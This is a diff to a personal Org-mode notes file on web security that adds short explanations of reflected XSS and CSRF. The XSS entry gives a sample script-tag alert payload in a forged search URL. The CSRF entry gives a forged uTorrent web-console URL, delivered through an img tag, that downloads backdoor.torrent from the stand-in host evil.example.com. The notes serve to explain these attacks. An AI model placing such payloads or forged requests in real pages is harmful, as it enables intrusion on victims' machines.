@@ -2,6 +2,10 @@
 
 * Table of Contents :TOC_2_gh:
 - [[#how-to][How-to]]
+- [[#topics][Topics]]
+  - [[#web-storage-vs-cookies][Web Storage vs. Cookies]]
+  - [[#xss-cross-site-scripting][XSS (Cross-site scripting)]]
+  - [[#csrf-cross-site-request-forgery][CSRF (Cross-site request forgery)]]
 - [[#reference][Reference]]
   - [[#cache-control][Cache Control]]
   - [[#cookies][Cookies]]
@@ -10,10 +14,34 @@
   - [[#endpoint][Endpoint]]
 
 * How-to
+* Topics
+** Web Storage vs. Cookies
+- https://auth0.com/docs/security/store-tokens
+
+** XSS (Cross-site scripting)
+- https://en.wikipedia.org/wiki/Cross-site_scripting
+
+An attacker observes that target website contains a reflected XSS vulnerability:
+1. Search feature: If no results were found, the page will display the url with the query term, like http://bobssite.org?q=term.
+2. Submit a search query with a term like ~<script type='text/javascript'>alert('xss');</script>~
+3. An alert box appears (that says ~xss~).
+4. The url is ~http://bobssite.org?q=<script%20type='text/javascript'>alert('xss');</script>~
+5. The attacker sends an e-mail which contains a link to the forged url.
+6. The victim gets the link and executes the attackers script.
+
+** CSRF (Cross-site request forgery)
+- https://en.wikipedia.org/wiki/Cross-site_request_forgery
+
+Force a ~.torrent~ file download:
+1. uTorrent's web console is accessible at ~localhost:8080~
+2. Forge a url make uTorrent download ~backdoor.torrent~ automatically
+   - ~http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent~
+3. Inject the forged url as ~<img>~ tag like: ~<img src="<url>">~
+4. The victim opens the page containg the tag and download ~backdoor.torrent~ inadvertently.
+
 * Reference
 ** Cache Control
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
-
 *** Request
 #+BEGIN_EXAMPLE
   Cache-Control: max-age=<seconds>
